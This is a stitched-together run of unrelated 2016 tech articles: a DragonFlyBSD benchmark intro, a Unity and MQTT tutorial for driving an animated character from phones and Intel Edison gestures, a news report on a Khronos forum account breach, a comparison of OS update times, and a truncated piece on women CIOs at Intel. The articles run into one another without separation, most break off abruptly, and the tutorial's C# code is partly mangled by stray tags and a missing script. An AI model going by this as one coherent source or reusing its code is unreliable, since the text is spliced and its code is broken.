DragonFlyBSD 4.6 vs. Linux Benchmarks Written by Michael Larabel in Operating Systems on 6 August 2016. Page 1 of 4. 13 Comments With DragonFlyBSD 4.6 having been released this week, here are benchmarks comparing its performance to that of the previous DragonFlyBSD 4.4 release as well as seeing how it compares to some Linux distributions. The DragonFlyBSD 4.6 release premiered with NVMe PCI-E solid state drive support, significantly improved SMP performance, improved i915 DRM Intel graphics support, initial EFI booting support, new packages, and other changes. On an Intel Xeon E5 v3 Haswell system I did a clean stock install of DragonFlyBSD 4.6.0 and compared its out-of-the-box performance to DragonFlyBSD 4.4.3. In addition, on the same system its performance was compared to Ubuntu 16.04.1 LTS, Ubuntu 16.10 in its current development form, and Intel's Clear Linux 9710 distribution. All of the tests were done on the same system (on the system table the CPU frequency differences just come down to boost vs. base clock frequency reporting and other reporting differences). DragonFlyBSD 4.6 ships with the GCC 5.3.1 compiler. All of the BSD/Linux distribution benchmarks carried out for this article were fully-automated using the open-source Phoronix Test Suite benchmarking software. The tests for this article are mainly focused on CPU performance and all tests are built from source for the respective platform using the out-of-the-box compiler and OS settings.

Introduction In this tutorial we will cover a different perspective how we can use Unity and for virtual experience.We will work on an animation system give complete life to our character and add a different dimension by bringing in the scope of MQTT adding Intel Edison to feel the magic.In between we will also describe the animation system and controls on giving state transitions to our character while applying movement. 2. Background This article is more of a research I was doing where I thought where can I fit in IoT in terms of VR.To start with for its easy learning curve I chose Unity IDE.It fits in the best for creating the project more lively. For the integration part research was made with communication medium for remote interaction with Unity and IoT device. After all details and feasibility I found out the best way to do it was with MQTT.For adding a character I had to go through lot of details what kind of characters fit in best for the project. I tried Mixamo for details in animation for the character and certainly I found it useful but for the project purpose chose and easy way from Unity asset store a character and free custom animations associated with it.Here in I share my experience for the project that got  created.   3.What we intend to do Conceptually it was just a dream that I could make the things working out at place so it was a tough job to start with The Unity part 1)We needed characters that can be used freely for our project purspose and we had very less time.Creating a character in Blender would take time(I know very less Blender alltogether!!).Obvious choice was something that was freely available in Unity. 2)Unity Asset store to the rescue :- I was working aroud which figures and characters were obvious for me so I thought a Doll like character will shape up and give the project good shape hence we started searching and goodness gracious really the store had great assets and then Unity Chan model as these model was well explained in Unity forum and it was very easy to tweak it. 3)Adding animations:- As we found this character had lots of animation state to use.Hence the animation control came to the limelight.We studied lots of tutorial in implementing animations and then we were good to go. The IoT part:- This was the most trickiest part as we had to bring in a new dimension to iteraction within Unity. 1)Obvious thinking was how could I communicate between the Unity project and the IoT device, studied a lot then found out that mqtt was the best choice. 2)Now the next thing was to integrate the mqtt within Unity it was a tough job had to dig in deep then found out a github library that came to the rescue for me. 3)Next step was tweaking the code integrating it with our scene for further assistance for our project.I did it with getting to know the basics of it and delving in deep into the code. 4)I tried the first communication with mymqtt app to try mapping the movements broken down into different mediums and commands that will work and yes it was a success.   The proposed pipeline The next figure shows the proposed pipeline for the project workflow.It was a tedious part on how I can manage the entire scenario at one place but as I gained knowledge different ideas came into view hence the flow. Download the latest version of Unity to start with.Make sure you are targeting for which platform 32 bit or 64 bit.then push for the download. The workflow Let's break the workflow 1)We design the game concept at Unity ,the movement ,we make a scene add capabilities for interactions.Then we set up animation control and get it going with keyboard keys (up,down,left and right).It came along very well. 2)We started the process of how we can do the interactions with IoT levels then we searched a lot of content and found mqtt the best fit.We integrated it. 3)Next step was to see that if we were able to communicate with the unity scene directly .On and android phone installed the mymqtt app and then subscribed to the channel we configured in the mqtt client.We did basic interactions with numbers to see if we were able to communicate and it worked out well.So the next thing 4)We used Android Studio to create an app where we integrated mqtt to interact with the Unity scene with forward,backward,left and right movements.It went along superbly. 5)As it was Unity we converted it to WIndows 10 UWP(We decided not to do it as MQTT was not working with it) Hence 5th changed to Google cardboard. 6)We integrated with RealSense.   Let's start with Unity 1)firstly we will have to download Unity for the setup.firstly you need to make sure that which platform you intend to install for 32 bit or 64 bit. 2)Go straightforward to the website download the executable. Here in this page you will have an option for downloading the version of unity just start downloading. In the next page you will have variety of options for downloading Unity we have chosen the free version. Choosing free version allows us to test and build our app and also publish it. In the next step you will get an option for downloading the installer.After downloading the installer we need to choose target platforms the basic ones being PC,android build and others. After installation it is now our turn to select and start the project. For the first time when you login it asks for your Unity ID(make sure you are registered,as with its help you can now download the asset from asset store otherwise you can also work offline) We open Unity give a name to the project.Make sure 3d toggle option is selected.Then we click on create project. Before going further now we need to know what unity asset store actually is. The Unity Asset Store Unity Asset store is a market place where you get project assets that you can easily use.Some of the great assets are free and some of them are paid. Why use Asset Store? If we are a single developer its very difficult to find time to actually design the character add animations and other logic to it.The learning curve is steep when we are trying to learn new 3d designing tools.To bring our logic into reality we need animations,characters that are pre built.We can easily engage our self to C# code and use the language to our full potential to bring the entire gaming experience to reality.We although have to figure out the animation control ourself. The concept of doll From my childhood I had this special fascinations with playing with dolls keeping it ourself when we used to get to bed,tell stories(yes those golden days were so much fun... I wish I could go back).We get readily attach to the baby dolls that and weave in fairy tales.Hence when I started this project I wanted to go back and relive it so we started.We had in our mind that we will have to make a simple system where it can move back and forth and easily controllable through our IoT device. The search at Asset Store We always wanted to give our applcation a classic fairy tale look and we found that one character and one low poly count model was very useful for us. Unity Chan model This Japanese model was too cute for our liking hence we thought we could use it.There was also a tutorial on how to use it. The flexibilty was 1)Animations 2)Cuteness of the character 3)Easily configurable to our liking Now for our environment setup we had to choose a low poly environment that could give our scene a special feel.Indeed I found one the "low poly count environment".It was classy and it was our type. Mixing them both The ideas was to create a scene where we can bring in both characters together to start with we took example from the already added asset.We opened up the demo scene to check the capabilties of the model.It was indeed cool. Now it was the part of importing the low polycount model and test the scene. After opening the test scene indeed we found it was worth working with. The experiment time We included the Unity chan model now it was for us to start the coding and configuration. As the character was facing the other side of camera we had to rotate it so used the rotating tool in Unity to change the view of the character. Now it was our term to decide on the animation control system. The Unity Animation controller The unity animator controller organises your animation control in a state oriented manner.The speciality is you can drive in different sets of animations in one place.We can also have subsets of animation it is called blend state.Now first of all We though we try out with simple animation transitions. Let's start again In the project tab we have to right click then we get options to create the animation controller. We name it and then drag it to the Unity chan model animator controller. Next we double click the animation controller we see the states. Let's break the state machine system we have by default any state,entry state and exit state. Make sure that apply root motion is unchecked. Now lets bring in some animations we intent to work with we drag the wait animations to picture. Its time to save the scene.Give it a name and save it. Time for the MQTT client   What is MQTT? as per wiki mqtt is a machine to machine "IoT" protocol.It's highly reliable and it is easy to transfer or transmit messages on fast and accurate manner.     We searched a lot in internet but there was one github link that came in for the rescue.     We downloaded it and imported it our project.We opened the example scene in unity. It was able to send and receive MQTT message. For our receiving.sending purpose we thought of a trick we used the mymqtt app from google play store so that we can send/receive data to channel. MYMQTT app link The easy way because it was very easy for us to communicate. The app has Dashboard,Subscribe,Publish,Stored Messages and Settings The settings is the most important section in our view. Here in the main broker url tab we give in  iot.eclipse.org and port is 1883.   Animation control   Let's go back to animations again we have handled the mqtt part we will cover the code changes as we make the animation control going. The structure looks like this after importing and adding the details in the scene. Now as adding the wait animations we see in the animation controller that in orange color one of the waiting states its the default state of animation. We can just right click on any state and then make it to default state.From the other waiting states we make a transition to the default state as shown in figure above. Now we will start working on a C# script. When we create the script it is empty.   We go to assets then create and then C# script. This script will work as our point for controlling the animations. to start with the script is empty. //
// using UnityEngine;
using System.Collections;

public class Play : MonoBehaviour {

	 Use this for initialization
	void Start () {
	
	}
	
	// Update is called once per frame
	void Update () {
	
	}
}

//   in the script first we need to assign animator hence we declare it as  public Animator Animd;
 getting access to  animator controller we have get the component that drives the animation. Animd = GetComponent<animator>();
// </animator>
 for getting different keys for interactions we declare it in update method it allows us to check if we have pressed keys in keyboard,touch control or other inputs  if (Input.GetKeyDown("1"))
    {
        Animd.Play("WAIT01", -1, 0.5f);
    }
    if (Input.GetKeyDown("2"))
    {
        Animd.Play("WAIT02", -1, 0.5f);
    }
    if (Input.GetKeyDown("3"))
    {
        Animd.Play("WAIT03", -1, 0.5f);
    }
    if (Input.GetKeyDown("4"))
    {
        Animd.Play("WAIT04", -1, 0.5f);
    }
//
 where "WAIT01" is the name of the animation "-1" gives the layer of the animation control system.The animation control system can be broken down into sublayers when you create a transition system. "0f" it shows from which point the animation starts playing on. Now we will work on the movement horizontally and vertically hence we need to declare the parameters.It will be a float format. For horizontal and vertical we had to declare 2 parameters. Now we need to go back to the script and declare it. private float inputH;

private float inputV; Now we need to detect the horizontal and vertical axis. inputH = Input.GetAxis("Horizontal");

 inputV = Input.GetAxis("Vertical"); Now we need to the  put the values of inputH and inputV. Animd.SetFloat("inputH", inputH);
Animd.SetFloat("inputV", inputV); It's time now to create a new blend tree so that we can add a sublayer to the animation control In this layer we will be adding movement animations where we can portray movements in left ,right,up and down direction. We make the blend tree type 2D simple directional. and the parameters as inputH and inputV. In the motion list  we add different motion field  we add four of them for adjustment. We need to update the values  As we have added the movement now it's time to see how the sub layered blend tree look like.Add the Motion obtion we substitute with the apprpriate movement on left,right,up and down. The movement mapped to motions. Now the sublayer looks like this.Blue dots are our animations and red dot is how we blend close. Now we make a transition from Base layer to sublayer(as we have done before left click do transition to the sublayer).Now we select the transition clicking on the arrow connecting WAIT00 and move. We have to uncheck "has exit time" option as doing that will allows us to not wait for the animation and go to the next state. Now we go to the conditions option.Where we setup inputV and inputH and goes to particular condition when greater than 0.1. Now we add another condition. When inputV less than -0.1 then we go to the previous transition.We used multiple Blend tree transition for proper reflectiong of movement. Next step is add rigid body to Unity Chan model and make sure gravity is unchecked. Now we add the movement to the rigidbody we need to go back to the script. Animd.SetFloat("inputH", inputH);
        Animd.SetFloat("inputV", inputV); We add the movement based on the directions float moveX = inputH * 20f * Time.deltaTime;
 float moveZ = inputV * 25f * Time.deltaTime;
   Then we add those back to the rigid body component.
       rbody.velocity = new Vector3(moveX, 0f, moveZ); The MQTT thing in Unity Let's take a look at mqtttest.cs file     using UnityEngine;
using System.Collections;
using System.Net;
using uPLibrary.Networking.M2Mqtt;
using uPLibrary.Networking.M2Mqtt.Messages;
using uPLibrary.Networking.M2Mqtt.Utility;
using uPLibrary.Networking.M2Mqtt.Exceptions;

using System;

public class mqttTest : MonoBehaviour {
	private MqttClient client;
	// Use this for initialization
	void Start () {
		// create client instance 
		client = new MqttClient(IPAddress.Parse("143.185.118.233"),8080 , false , null ); 
		
		// register to message received 
		client.MqttMsgPublishReceived += client_MqttMsgPublishReceived; 
		
		string clientId = Guid.NewGuid().ToString(); 
		client.Connect(clientId); 
		
		// subscribe to the topic "/home/temperature" with QoS 2 
		client.Subscribe(new string[] { "hello/world" }, new byte[] { MqttMsgBase.QOS_LEVEL_EXACTLY_ONCE }); 

	}
	void client_MqttMsgPublishReceived(object sender, MqttMsgPublishEventArgs e) 
	{ 

		Debug.Log("Received: " + System.Text.Encoding.UTF8.GetString(e.Message)  );
	} 

	void OnGUI(){
		if ( GUI.Button (new Rect (20,40,80,20), "Level 1")) {
			Debug.Log("sending...");
			client.Publish("hello/world", System.Text.Encoding.UTF8.GetBytes("Sending from Unity3D!!!"), MqttMsgBase.QOS_LEVEL_EXACTLY_ONCE, true);
			Debug.Log("sent");
		}
	}
	// Update is called once per frame
	void Update () {



	}
}
   The point where we need to change the part in the code is here. The client will be dircted towards our channel client = new MqttClient("iot.eclipse.org", 1883, false, null);
 Now we subscribe to the channel // subscribe to the topic "/home/temperature" with QoS 2 
        client.Subscribe(new string[] { "rupam/data" }, new byte[] { MqttMsgBase.QOS_LEVEL_EXACTLY_ONCE });   The updated mqttclient cs file     using UnityEngine;
using System.Collections;
using System.Net;
using uPLibrary.Networking.M2Mqtt;
using uPLibrary.Networking.M2Mqtt.Messages;
using uPLibrary.Networking.M2Mqtt.Utility;
using uPLibrary.Networking.M2Mqtt.Exceptions;

using System;

public class mqttTest : MonoBehaviour {
	private MqttClient client;
	// Use this for initialization
	void Start () {
        // create client instance 
        client = new MqttClient("iot.eclipse.org", 1883, false, null);

        // register to message received 
        client.MqttMsgPublishReceived += client_MqttMsgPublishReceived; 
		
		string clientId = Guid.NewGuid().ToString(); 
		client.Connect(clientId);

        // subscribe to the topic "/home/temperature" with QoS 2 
        client.Subscribe(new string[] { "rupam/ar" }, new byte[] { MqttMsgBase.QOS_LEVEL_EXACTLY_ONCE });


    }
    string msg = "";
    public static int Num = -1;
    void client_MqttMsgPublishReceived(object sender, MqttMsgPublishEventArgs e) 
	{
        try
        {
            msg = System.Text.Encoding.UTF8.GetString(e.Message).Trim();

            
            if (msg.Equals("STOP"))
            {
                //Num = 4;
                player.LR = -1;
                player.FR = -1;
                
            }
            if (msg.Equals("NO"))
            {
                player.LR = -1;
            }
            if (msg.Equals("FORWARD"))
            {
                player.FR=1;
            }
            if (msg.Equals("REVERSE"))
            {
                player.FR=0;
                Debug.Log("REVERSE");
            }
            if (msg.Equals("LEFT"))
            {
                player.LR = 3;
            }
            if (msg.Equals("RIGHT"))
            {
                player.LR = 2;
            }
            if (msg.Equals("JUMP"))
            {
                player.jump = true;
            }
            if (Num != -1)
             player.Num = Num;

        }
        catch
        {

        }

        Debug.Log("Received: " + msg+" Num="+Num  );
	} 

	void OnGUI(){
		if ( GUI.Button (new Rect (20,40,80,20), "Level 1")) {
            Debug.Log("sending...");
            client.Publish("hello/world", System.Text.Encoding.UTF8.GetBytes("Sending from Unity3D!!!"), MqttMsgBase.QOS_LEVEL_EXACTLY_ONCE, true);
            Debug.Log("sent");
        }
	}
	// Update is called once per frame
	void Update () {
        if (Num != -1)
            Debug.Log("Updating..." + Num);




    }
}
 The key point of the updated code is msg = System.Text.Encoding.UTF8.GetString(e.Message).Trim(); where we encode the message and trim it.It helps for recognizing the messages that are sent via mqtt in faster manner.And the place where we have handled the movements is the crux for the project.Stress upon the mapping part of the code where we exchange the commands of mqtt.   Now let's look at the changes we did to main player script. For forward and Left values of the player we have assigned a value of -1. For multiple walk movements together we have used inputH and inputV values respond to the mqtt commands. using System.Collections;

</rigidbody> This part of the code allows us to connect to MQTT and use the service.   Google Cardboard Integration Integration to Google Cardboard was the final thing as Microsoft Hololens didn't support the MQTT hence decided to settle down with Google Cardboard.At first we started we were hoping where do we start but found the Unity starting point at Google Cardboard link.   Now we need to go to the Git repo to download it. Save the download.Then extract it.   Now you need to import he google cardboard package in unity. The scene that we used for our experimenting and integration purpose was the headset demo scene which had all the requirements fullfilled for our work. The most important part for our scene was camera integration in terms of VR perspective.Then additional setup for thr scene.Let's start with it.In our scene the first thing that was to be copied was GVR reticle.The GVR reticle needs to be attached to the main camera.Next we had to to copy GVR View main,floor canvas,event system and overlay canvas. After copying our scene looked like this while running. Now we are good to go with Google cardboard the scene is compatible now with google cardboard. We will now make the apk for the project.First of all we need to change the build configuration for the project to android. Now when we work on the build its tarts compiling and building for android. After the compiling process is over an apk file is created. Controlling The Puppet With hardware Now that we have added Mqtt gateway into the project, it's time to control it. For an Android based control, all you have to do is to generate Mqtt commands intuitively from the Android app. We have shows how a simple Mqtt based remote control can be created in this article. Please refer the article and download the app. Android Mqtt remote control ( YouCar Project) Controlling The Puppet with Gesture You can also use custom gestures for controlling the puppet.Please refer to this section of  YouCar. You need to change the Mqtt channel. Keep the channel specific to your project or user so that when other users are using your app, their command doesn't interfare with the current user's command.We tried the gesture part (Intel Realsense)with both of us(me and Rupam far apart in different places in India one in eastern part and other in southern part we came up pretty interesting results.We were able to control unity character(or puppet) still far apart and that's the power of mqtt. The pictures as using exchange using teamviewer. Controlling Puppet With Intel Edison IoT Device This part was worked upon by our other co-author Moumita Das and she created the different gestures for using with Intel Edison.Finally those gestures are mapped by mqtt to use as a wearable for our project. Please refer to this article on Accelerometer based gesture recognition in Intel Edison by Moumita Das  for understanding the circuit and the code for gesture recognition and integrating IoT device gesture into the context of the current app. That article elaborates UP, DOWN, LEFT and RIGHT gestures. You can easily integrate FORWARD and REVERSE gesture with the framework and use that in current context.  Why the Hololens experiment failed   We don't have a hololens device but we are extensively working on the hololens emulator(love to have one if somebody sponsors it :-) ) and have done lot of work reagerding it.We are also working on a book for hololens.First our idea was to get hold of the hololens Origami project.Each and every project I built was on top of it.Some recent experiment pictures. When the project runs in emulator it gives the same unity splash screen. Lastly we made a game with spatial mapping where we air tap(gesture) balls fall and we score points in free space where the holograms are placed. Finally we thought we will bring the same expertise to work but didn't work.The general case was the .net framework for unity(3.5) mqqt was not ready to be referenced and we were unable to add the mqtt framework to it.We searched a lot in internet but we were unable to find the right answers.Some of the fellows at unity forum suggested that we can add the framework if we had the IL2CPP backend. But that extension is not there in the hololens technical preview. The il2cpp backend is not available till now and hence we couldn't do it.We are keep on trying it and will ofcourse take different routes too.In the next bloack diagram we show the entire workflow we tried for hololens and where it failed.   Conclusion   After the complete experiment we have made a complete framework for Unity which can be extended to other games easily(we will be doing it) and can controlled by gestures,phones and other wearable device anywhere the only coonected medium required is internet.It was a fascinating experience.   History   Keep a running update of any changes or improvements you've made here.

By India Ashok August 6, 2016 05:10 BST Close Embed Feed Cyber Warfare: The Black Hole of Online Crime IBTimes UK <iframe src="http://www.ibtimes.co.uk/videos/embed/4103" width="640" height="360" frameborder="0" scrolling="no"></iframe> Hackers have allegedly managed to get their hands on employee accounts of Google, Apple, Samsung and more tech firms, by hacking into a developer forum that is commonly used by developers for a variety of options, including computer design and game development. The data comes from the Khronos website. Employee accounts of other tech giants, including IBM, Panasonic, VMWare, EA, Toshiba, Intel, Sony Ericsson and more have also been reportedly stolen by the hackers. It is likely that the stolen data has been kept private among a group of hackers. According to a report by Motherboard, who was provided an SQL file of nearly 3,000 accounts for the breached Khronos site, the data exposed included email addresses, usernames, plaintext passwords, sign up IP addresses and dates, and in certain cases physical addresses. It is still unclear as to how many users have been affected by the breach. Although Khronos has been notified of the breach by Motherboard, the firm is yet to make an official statement either confirming or denying the breach. "Khronos Membership puts your company at the forefront of the development of these APIs, and lets you collaborate with over 100 industry-leading member companies across the globe," reads the company membership website. The email addresses and usernames of 18 accounts have been reportedly tested and found to be corresponding with the accounts on the breached site. The data dump included the exposed account of an unnamed renowned security researcher, who confirmed that details including sign-up date, password and IP address appeared to be accurate. It is still unclear as to how many users have been affected by the breachiStock Fortunately, unlike the layperson, most developers do not fall into the trap of password reuse. One victim of the breach told Motherboard that he generates unique passwords of every site with the help of a password manager. This means the hackers will not be able to use the passwords from the victim's stolen account to access his other accounts. However, most of the other passwords examined were reportedly found to be fairly weak and predictable. The breach is yet another reminder of the dangers posed by the practice of password reuse. Previous high-profile data breaches sustained by tech giants like LinkedIn, MySpace and others also saw how hackers can exploit users' habit of reusing passwords to hack into other accounts. Users have since been advised to abandon the practice and generate unique and strong passwords for each of their accounts and also activate two-factor authentication as an added security measure. IBTimes UK has reached out to Khronos Group for further comment on the breach and is awaiting a response.

Credit: Thinkstock More like this Upgrading to Windows 10 and questioning <i>The New York Times</i> 20 fixes for a Windows 10 update meltdown The shame of Windows Update Video Mingis on Tech: The MacBook Pro show-and-tell Installing bug fixes is a big part of Defensive Computing. When I recently updated devices running five different operating systems, I took the opportunity to compare how they installed their latest patches. The tests were run on July 27th. Hardware-wise, all the devices were old, but their software was reasonably up to date, lacking only the latest round of updates. All in all, it seemed like a fair fight. I cold booted each device and waited for it to settle down before updating the operating system. Typically a computer does some housekeeping when it first boots and/or when it first goes online. So, I let each device sit for a while. Then, on Windows and OS X, I updated Firefox to insure that the internet connection was working well. On iOS, I waited for the app store to phone home. It initially said that 5 apps needed to be updated, but after a short delay, upped that number to 31. On Chrome OS, I just waited a few minutes. In each case, the operating system update was the only thing the device was doing. Four devices used the same 2.4GHz Wi-Fi network with a very strong signal (they were in the same room as the router). The fifth device, a Windows 7 desktop, used Ethernet as that's all it had. Timings are reasonably accurate but I wasn't using a stopwatch. I tried to limit the updates to just the operating system, something that comes quite naturally in iOS and Chrome OS. Windows 7 and 8.1 offer this as an option, but I am not aware of any way to limit OS X. In my test, it also updated Safari, iTunes and a couple other applications.  THE PLAYERS The five tested devices were: 1. A 64 bit Windows 7 desktop PC running an Intel Core i5-3470 (3.2GHz) with 8GB of RAM and a mechanical hard drive connected via SATA III. It had last been updated on June 17, 2016. 2. A 32 bit Windows 8.1 tablet running an Intel Atom CPU model Z3745 (1.3GHz) with 2GB of RAM and a 32GB SanDisk SDW32G connected with an interface that Speccy calls "SD." It was last updated on June 25, 2016. 3. A first generation iPad Mini model MD531LL/A running iOS version 9.3.2. 4. A MacBook Air laptop dating back to November 2010 (model A1370). It's running an Intel Core 2 Duo (1.4GHz) with 2GB of RAM and OS X Yosemite version 10.10.5. 5. An Acer C710 Chromebook with 2GB of RAM, manufactured in May 2013. It was on the stable channel, running the 64 bit edition of Chrome OS version 51.0.2704.106, which has a build date of July 6, 2016. THE BAKE OFF Windows 7 has been plagued, for months, with OS updates that take forever to install. Sadly, this remains true, it took Windows 7 longer than any other system to install its bug fixes. Windows updates itself in two phases; first it figures out the missing bug fixes, then, in phase 2, it downloads and installs them. The first phase took 1 hour and 38 minutes to complete, by far, the slowest of the tested systems. The first phase found seven missing patches but defaulted to only installing six of them. For whatever reason, it opted not to install KB971033. The six patches totaled 74 megabytes, and it took 5 minutes to download and install them. The shutdown and reboot took 2 minutes. TOTAL TIME: 1 hour 45 minutes Windows 8.1 Windows 8.1 updated itself faster than Windows 7, even though the tablet hardware was far less powerful than the desktop system. Still, it was the second slowest device. The first update phase, determining the missing bug fixes took an hour and 6 minutes. The system needed 11 patches, totaling 199 megabytes. Phase 2, downloading and installing the patches, took 7 minutes. At one point in the reboot process, the screen was totally blank. Maybe it always does that, I don't use Windows 8 much and never paid particularly close attention.The shutdown and reboot took 3 minutes. TOTAL TIME: 1 hour 19 minutes iOS 9 Updating iOS 9 was a drastically different experience. As soon as the process started, the system already knew that it had to install version 9.3.3, and, how big the download would be. The process however, was the most confusing of the five systems. The early stages are confusing because it reports the status of the update in three different locations. The later stages are confusing because there is so little status information. It also tried to calculate a time estimate, but never did. The initial statuses were "Update requested" and "Downloading". Then, while it was still downloading, it was also in "Preparing update" status. Then a small white window was displayed but it disappeared before I could read what it said. After the download completed, one location reported that it was "installing" while another location reported that it was "verifying the update." Apple likes progress bars, but, for whatever reason, makes them very thin. So thin, it is hard to see the progress. It's not for lack of space, even with the screen mostly empty, the progress bar height is measured in molecules. And none of the progress bars were accompanied by a percentage, which just adds insult to the injury of barely being able to see them. At one point the screen went totally black, then a white apple appeared, then all black again. Then a white apple with a progress bar. Then the progress bar disappeared, then another progress bar appeared, but there was no progress for a while, it appeared to be hung. To paraphrase an old movie: Words? We don't need no stinking words.  Eventually there was movement on the latest progress bar, then it disappeared, leaving a black screen with white apple on it. Finally, the normal logon screen appeared for a few seconds, then the screen went black again.  From start to finish the process took 29 minutes. As I was finishing up this blog, Apple issued another iOS update, 9.3.4, which took me 23 minutes to install. AVERAGE TIME:  26 minutes OS X Yosemite Like iOS, Yosemite knew very quickly that it needed to install security update 2016-004. As noted earlier, I was unable to install just this update so it also downloaded and installed Safari, iTunes, Remote Desktop Client and something called SU_TITLE - 768 megabytes of software. I was able to ignore the updates to Pages, Keynote, Numbers, GarageBand and iPhoto. The download started quickly, but after about 600MB, it slowed down. The initial time estimate was 2 minutes but with 108MB to go, there were an estimated 6 minutes remaining. After downloading 734MB, it estimated that the remaining 34MB would take 2 minutes.  I don't think that the slowdown was on my end. When the download started, the MacBook had the Wi-Fi network all to its own. During the download, the Windows 8 tablet downloaded its 199MB payload very quickly. Even after the Windows 8 tablet was done, the MacBook download continued to crawl. In the end, it took 18 minutes to download the 768 megabytes. After rebooting, the system estimated that it would take 7 minutes to install the new software. There was a progress bar and a time estimate that continued to adjust. Nice. Then, another reboot and yet another progress bar. The initial estimate was pretty good, installing the software and rebooting took 8 minutes. After all this, the system was still running version 10.10.5, which I found puzzling. I'm not a Mac user, this may be normal, but I wondered if something had gone wrong. A little poking around (Apple icon -> About This Mac -> System Report.. button) turned up a System Information report that includes a log of software installations. The log confirmed that Security Update 2016-004 had just been installed, so OS X loses brownie points for not fully indicating the operating system version. Both iOS and Chrome OS display an operating system version number that increases when the OS is updated, which, to me, seems like a better approach. The log also showed that the MacBook was at a dis-advantage in this contest. The previously installed Security Update was 2016-002 so this was the only device missing two rounds of bug fixes. And, it showed that along with the Security Update, it also installed Safari 9.1.2, iTunes 12.4.2, Remote Desktop Client Update 3.8.5.1 and the mysterious SU_TITLE which has no version number (more points deducted).  TOTAL TIME:  26 minutes Chrome OS The transparency of software updates is, to me, one of the best things about Chrome OS. End users are not asked or told anything about updating any software. It just works. That said, Chromebook users can opt into the bug fix game if they want.  To kick off a software update, run the browser and do: Help -> About Chrome OS and then click on the "Check for and apply updates" button. In my test, the check for updates took seconds, then it transitioned to "Updating your device..." During this phase it displays a completion percentage, but offers neither a time estimate (hat tip to OS X) nor an indication of how how much data is being downloaded. When the completion percentage hit 100% it sat there for a bit before telling me to "Restart your device to finish updating." At this point the black upward pointing arrow (the standard indication that a reboot is needed) also appeared in its usual spot on the bottom right of the screen. Unlike the other OSs, when Chrome OS reboots to install new software, it is a standard, ordinary restart. There is no warning not to turn off the computer as in Windows. There is no non-standard user interface as in OS X and iOS. There is no progress bar. It tells the end user nothing. It just reboots. As noted earlier, the system started out at version 51.0.2704.106 (Help -> About Chrome OS from the browser). After the update, it was running version 52.0.2743.85. A nice thing about Chrome OS is that it also assigns a date to the operating system. The "About" page has a "more info..." link that when clicked shows the Build Date of the system. I started with a system that was built on July 6, 2016 and ended with one built on July 21, 2016. The date is a bit more hidden than I would like, but still, Chrome OS is the only system that provides dates. TOTAL TIME:  4 minutes BAKE-OFF OBSERVATIONS The Windows devices had a hardware advantage, not that it mattered. To recap the timings: Chrome OS took 4 minutes, OS X Yosemite took 26, iOS 9 needed 29 minutes the first time and 23 minutes the second, Windows 8.1 took an hour and 19 minutes, and Windows 7 needed an hour and 45 minutes. I think it's fair to say that Chrome OS does the best job of self-updating. Not only is it fast, but it's also automated far beyond any other system. It is so automated, that it doesn't have to tell the end user anything. Chromebook users are not even aware that software is being updated - a small black arrow is the only user interface for software updates, and it can be ignored without penalty. I like that the version number of the operating system increases as updates are installed and it's the only OS that assigns itself a date in human readable format. Finally, Chrome OS auto-updates everything, the operating system, extensions, plug-ins and, yes, Flash too. It is the gold standard for software updating.  FLASH The Adobe Flash Player, while not part of any operating system, is a thorn in the side of many. It may well be the most dangerous software in the world, considering both how buggy and how widespread it is.  Flash is not an issue on iOS, which offers no support, or Chrome OS, which auto-updates it, but on Windows and OS X, it's a mess. Windows 8 and 10 will at least update Flash along with the operating system, but just for Microsoft's browsers. OS X however, is totally hands off. In my test, even the just-updated Safari browser was still using an old version of Flash.  On both Windows and OS X, the Defensive Computing approach is to limit Flash to the Chrome browser, which both auto-updates it and tries to disable its use in advertisements.  Related: Apple Mac Apple iOS Chrome OS Windows PCs Apple Google Microsoft 1 2 Page 1 Next 12 steps to lower your espionage risk Shop Tech Products at Amazon You Might Like Notice to our Readers We're now using social media to take your comments and feedback.

First off, women CIOs at Intel Corp. are hardly a novelty. Tolliver succeeds Kim Stevenson, who served as the company's CIO for the past four years and who on Monday became COO of Intel's client and internet of things (IoT) businesses and systems architecture (CISA) group, its biggest revenue-generating division. The woman CIO thing at Intel doesn't stop there. Back in 2012, Stevenson took over the Intel CIO role from Diane Bryant, who went on to manage the company's data center group and in April was promoted from that group's general manager to its executive vice president. It's true the Intel CIO position wasn't filled by another woman from within the company. But the fact that Tolliver comes from the outside actually reinforces the argument that the high-profile hire is perhaps less about gender and more about business. Since taking over at Intel in 2013, CEO Brian Krzanich has broken from the company tradition of promoting from within to look outside for new talent. Notable recruits include Chief Marketing Officer Steven Fund, formerly at Staples and before that at Procter & Gamble; and CISA's president, Venkata "Murthy" Renduchintala, poached from Qualcomm a year ago and increasingly viewed as Intel's second in command. "Krzanich believes Intel needs to be re-energized through a number of avenues, one of which is that his senior staff represents a diversity of views from within and outside the company," said analyst Mark Hung, who covers wireless and IoT technologies for Gartner. "[Tolliver's] hiring definitely exemplifies that trend," he said. The icing on the women-in-high-tech-places news this week? Tolliver's CIO position at Dow Chemical was also filled by a woman: Dow IT veteran Melanie Kalmar. Glass ceilings breaking? Nah. Backward slide by women in tech To see the IT executive appointments at Intel and Dow as some sign that the notorious IT gender gap is rapidly closing would be, as many industry observers pointed out to me, a grave mistake. Not only do women remain grossly underrepresented in IT executive ranks, but the number of women preparing for such jobs is actually declining. Gartner, for example, based on its 2015 CIO Survey, estimated that just 14% of CIOs worldwide are women and pointed out that the figure has remained stagnant for the past 10 years. The 2016 Harvey Nash/KPMG CIO Survey put the current number of women in senior IT leadership roles even lower -- at just 9%, albeit up 3% from a year ago. In addition, young women are fleeing, not embracing, the computer sciences. In the past 30 years, the percentage of women graduates in computer sciences has declined from its peak in 1984 at 37% to just 18% today, according to Gartner. "It has gone down every year," said Debra Logan, a Gartner fellow who earned a master's degree in computer science in the mid-1980s and is puzzled by the trend. "Is it something that we choose, or is it something imposed from the outside, or both?" In any case, the CIO cohort remains notably monolithic, she said, especially in the U.S. and Western Europe, where the vast majority of CIOs are white men between the ages of 40 and 55. "There is not age diversity or gender diversity or racial diversity," said Logan, who is among a small contingent at Gartner now focused on the issue of IT diversity in the workforce. There's another point to be made about the Intel CIO appointment and the presence of women in executive IT roles, namely that the company is among the most committed in the technology industry to achieving diversity in the workforce. In 2014, Intel announced a $300 million diversity initiative "to accelerate diversity and inclusion" at Intel and across its network of suppliers. The company recently announced that it ended 2015 with 17.6% female representation in leadership, a 14.3% increase from 2014. The number of senior principal female engineers and fellows rose in 2015 to 21, up from 12 in 2014. And even those achievements come with an asterisk: As noted in a recent piece on Intel's diversity program by Davey Alba, Intel's goal of full representation of women among the company's technical workers is based on "market availability, or the percentage of women in the U.S. labor market overall who have the skills to fill available technical jobs" -- by Intel's estimation, 22.7%. By that measure, the 20.1% of Intel's technical jobs held by 